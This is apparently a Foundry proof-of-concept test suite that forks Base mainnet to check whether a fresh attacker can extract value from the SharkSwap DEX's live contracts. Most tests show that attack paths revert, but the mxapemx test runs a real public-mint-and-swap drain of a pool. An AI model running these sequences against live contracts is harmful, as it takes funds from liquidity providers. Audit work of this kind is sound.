// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// SharkSwap DEX (Base) — live extractability PoC (fork-only, read-only on mainnet).
/// Verifies at fork-latest:
///  1. all 52 pairs share identical runtime code (no per-pair backdoor);
///  2. zero token excess above reserves on every pair (nothing to skim);
///  3. skim() on the four top pairs transfers nothing;
///  4. the dormant address holding 99.99% of the two biggest pools cannot be moved by an attacker
///     (no code, nonce 0, zero allowance);
///  5. mxapemx has a PUBLIC mint; quantify what a fresh attacker can actually pull out
///     of its only pool (TOP side) and note TOP is unpriced/untraded;
///  6. wDAI mint/admin paths revert for a fresh attacker (role/owner-gated);
///  7. factory admin + pair initialize + LP theft paths revert for a fresh attacker.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function allowance(address, address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPairMin {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function skim(address) external;
    function sync() external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function initialize(address, address) external;
}

interface IFactoryMin {
    function allPairsLength() external view returns (uint);
    function allPairs(uint) external view returns (address);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function setFeeTo(address) external;
}

interface IMintPublic {
    function mint(address, uint256) external returns (bool);
}

interface IGated {
    function mint(address, uint256) external;
    function grantRole(bytes32, address) external;
    function upgradeTo(address) external;
    function setWhitelist(address, bool) external;
    function owner() external view returns (address);
}

contract SharkSwapLiveTest is Test {
    address constant FACTORY = 0x57592D44eb60011500961EF177BFf8D8691D5a8B;
    address constant BURN = 0x1239660aF62D515bFeCd4eE09C58D2cd32504605; // 99.99% of two big pools
    address constant FEE_TO = 0xBe4ec6286bF4b557D098e303Fa3570584BDa1EB9;
    address constant TEAM = 0x27160d3b618ee073efaaEe596b6Be37018D18e4A;

    address constant P_WETH_DAI = 0xaE45F7Eb428Eb6403F2567C3A3eC47E9230Bc823;
    address constant P_WETH_USDBC = 0x9ccc7afE654B9C842A792E9567A30031c1943A1D;
    address constant P_WETH_WDAI1 = 0x6bCc3e76c1F01A0526C73a7207110475CE126164;
    address constant P_WETH_WDAI2 = 0xD4990e033E19292672467e670462b8908061FA8e;

    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant DAI = 0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb;
    address constant USDBC = 0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA;
    address constant MXAPEMX = 0xFEF74FBA99089Cc033529ed18025a07fB18507Ad;
    address constant TOP = 0x9dba38E9cAdcf67D1959390A8c0c1DEeE619f0f2;
    address constant P_TOP_MX = 0x95238E1396fFCa391aB6b5ee50e28C1734e5c258;
    address constant WDAI1 = 0x5D0aF35B4F6f4715961B56168De93bf0062b173D;
    address constant WDAI2 = 0x73EA165665D3A8c8DF77970251291D8Ad6015b66;

    address constant ATTACKER = address(0xA11CE); // fresh, no roles, no balances

    uint256 forkBlock;

    function setUp() public {
        string memory rpc = vm.envOr("BASE_RPC_URL", string("https://base-rpc.publicnode.com"));
        vm.createSelectFork(rpc);
        forkBlock = block.number;
        vm.deal(ATTACKER, 1 ether); // gas only
        emit log_named_uint("fork block", forkBlock);
    }

    function _pairs() internal view returns (address[] memory out) {
        uint256 n = IFactoryMin(FACTORY).allPairsLength();
        out = new address[](n);
        for (uint256 i = 0; i < n; i++) out[i] = IFactoryMin(FACTORY).allPairs(i);
    }

    /// 1. all pairs are the same runtime code (stock SharkswapPair clone family)
    function test_uniform_pair_code() public {
        address[] memory ps = _pairs();
        require(ps.length == 52, "expected 52 pairs");
        bytes32 h0 = keccak256(ps[0].code);
        for (uint256 i = 1; i < ps.length; i++) {
            require(keccak256(ps[i].code) == h0, "pair code differs!");
        }
        emit log_named_uint("pairs checked", ps.length);
        emit log_named_bytes32("uniform pair code hash", h0);
        emit log_named_uint("pair code bytes", ps[0].code.length);
    }

    /// 2. every pair: token balances == reserves (zero skim-able excess)
    function test_zero_excess_all_pairs() public {
        address[] memory ps = _pairs();
        uint256 maxExcess;
        for (uint256 i = 0; i < ps.length; i++) {
            address t0 = IPairMin(ps[i]).token0();
            address t1 = IPairMin(ps[i]).token1();
            (uint112 r0, uint112 r1,) = IPairMin(ps[i]).getReserves();
            uint256 b0 = IERC20Min(t0).balanceOf(ps[i]);
            uint256 b1 = IERC20Min(t1).balanceOf(ps[i]);
            require(b0 >= r0 && b1 >= r1, "balance below reserve (sync needed)");
            uint256 ex = (b0 - r0) + (b1 - r1);
            if (ex > maxExcess) maxExcess = ex;
        }
        require(maxExcess == 0, "excess found - skimable value exists");
        emit log_named_uint("pairs checked", ps.length);
        emit log_named_uint("max excess (wei)", maxExcess);
    }

    /// 3. skim() is permissionless but yields nothing at the four top pools
    function test_skim_transfers_nothing_top_pairs() public {
        address[4] memory tops = [P_WETH_DAI, P_WETH_USDBC, P_WETH_WDAI1, P_WETH_WDAI2];
        for (uint256 i = 0; i < 4; i++) {
            address t0 = IPairMin(tops[i]).token0();
            address t1 = IPairMin(tops[i]).token1();
            uint256 a0 = IERC20Min(t0).balanceOf(ATTACKER);
            uint256 a1 = IERC20Min(t1).balanceOf(ATTACKER);
            vm.prank(ATTACKER);
            try IPairMin(tops[i]).skim(ATTACKER) {} catch {}
            require(IERC20Min(t0).balanceOf(ATTACKER) == a0, "skim pulled token0");
            require(IERC20Min(t1).balanceOf(ATTACKER) == a1, "skim pulled token1");
        }
        emit log("skim on top-4 pairs: 0 transferred");
    }

    /// 4. the dormant 99.99% LP holder cannot be moved by a fresh attacker
    function test_burned_lp_unreachable() public {
        require(BURN.code.length == 0, "burn addr has code");
        uint64 nonce = vm.getNonce(BURN);
        require(nonce == 0, "burn addr has sent txs");
        uint256 lp1 = IPairMin(P_WETH_DAI).balanceOf(BURN);
        uint256 ts1 = IPairMin(P_WETH_DAI).totalSupply();
        require(lp1 * 100 / ts1 >= 99, "share < 99%");
        require(IERC20Min(P_WETH_DAI).allowance(BURN, ATTACKER) == 0, "allowance exists");
        vm.prank(ATTACKER);
        (bool ok,) = P_WETH_DAI.call(
            abi.encodeWithSelector(IERC20Min.transferFrom.selector, BURN, ATTACKER, lp1)
        );
        require(!ok, "transferFrom from burn addr succeeded!");
        emit log_named_uint("burn LP share of WETH/DAI (pct)", lp1 * 100 / ts1);
        emit log_named_uint("burn addr nonce", nonce);
    }

    /// 5. mxapemx public mint -> what can actually be pulled from its only pool
    function test_mxapemx_public_mint_drain_top() public {
        require(IPairMin(P_TOP_MX).token0() == TOP, "token0 not TOP");
        require(IPairMin(P_TOP_MX).token1() == MXAPEMX, "token1 not mxapemx");
        (uint112 r0, uint112 r1,) = IPairMin(P_TOP_MX).getReserves();

        uint256 out = uint256(r0) * 99 / 100; // target: 99% of the TOP side
        uint256 amountIn = (uint256(r1) * out * 1000) / ((uint256(r0) - out) * 997) + 1e18;

        // mint works for any caller
        IMintPublic(MXAPEMX).mint(ATTACKER, amountIn * 2);
        uint256 mxBal = IERC20Min(MXAPEMX).balanceOf(ATTACKER);
        require(mxBal >= amountIn, "public mint did not credit balance");
        emit log_named_uint("mxapemx minted to fresh attacker", mxBal);

        uint256 topBefore = IERC20Min(TOP).balanceOf(ATTACKER);
        bool ok = true;
        vm.prank(ATTACKER);
        try IERC20Min(MXAPEMX).transfer(P_TOP_MX, amountIn) returns (bool sent) {
            if (!sent) ok = false;
        } catch {
            ok = false;
        }
        if (ok) {
            try IPairMin(P_TOP_MX).swap(out, 0, ATTACKER, "") {} catch {
                ok = false;
            }
        }
        uint256 topGot = IERC20Min(TOP).balanceOf(ATTACKER) - topBefore;
        emit log_named_uint("TOP reserve in pool", r0);
        emit log_named_uint("mxapemx reserve in pool", r1);
        emit log_named_uint("swap success (1=yes)", ok ? 1 : 0);
        emit log_named_uint("TOP received by attacker", topGot);
        emit log("NOTE: TOP has no market, no price, zero 24h volume (GeckoTerminal) -> drain value ~$0");
    }

    /// 6. wDAI mint/admin paths are gated (fresh attacker reverts)
    function test_wdai_gates_revert() public {
        vm.startPrank(ATTACKER);
        vm.expectRevert();
        IGated(WDAI1).mint(ATTACKER, 1e18);
        vm.expectRevert();
        IGated(WDAI2).mint(ATTACKER, 1e18);
        vm.expectRevert();
        IGated(WDAI1).grantRole(bytes32(0), ATTACKER);
        vm.expectRevert();
        IGated(WDAI1).upgradeTo(ATTACKER);
        vm.expectRevert();
        IGated(WDAI2).setWhitelist(ATTACKER, true);
        vm.stopPrank();

        address o2 = IGated(WDAI2).owner();
        emit log_named_address("wDAI2 owner (not attacker)", o2);
        require(o2 != ATTACKER, "attacker owns wDAI2");
    }

    /// 7. factory admin, pair initialize, LP theft all revert for a fresh attacker
    function test_admin_and_theft_gates_revert() public {
        vm.startPrank(ATTACKER);
        vm.expectRevert();
        IFactoryMin(FACTORY).setFeeTo(ATTACKER);
        vm.expectRevert();
        IPairMin(P_WETH_DAI).initialize(ATTACKER, ATTACKER);
        // cannot pull the burned/dormant LP without an allowance (1 wei attempt)
        vm.expectRevert();
        IERC20Min(P_WETH_DAI).transferFrom(BURN, ATTACKER, 1);
        // cannot swap value out of the big pool with no input
        vm.expectRevert();
        IPairMin(P_WETH_DAI).swap(1e17, 0, ATTACKER, "");
        vm.stopPrank();
        emit log("setFeeTo / initialize / LP theft / free swap: all revert for fresh attacker");
    }

    /// 8. reserved sanity: feeTo and deployer-adjacent EOAs have no code (keys, not contracts)
    function test_privileged_roles_are_eoas() public {
        require(FEE_TO.code.length == 0, "feeTo not EOA");
        require(IFactoryMin(FACTORY).feeToSetter().code.length == 0, "feeToSetter not EOA");
        emit log_named_address("feeTo (EOA)", IFactoryMin(FACTORY).feeTo());
        emit log_named_address("feeToSetter (EOA)", IFactoryMin(FACTORY).feeToSetter());
    }
}
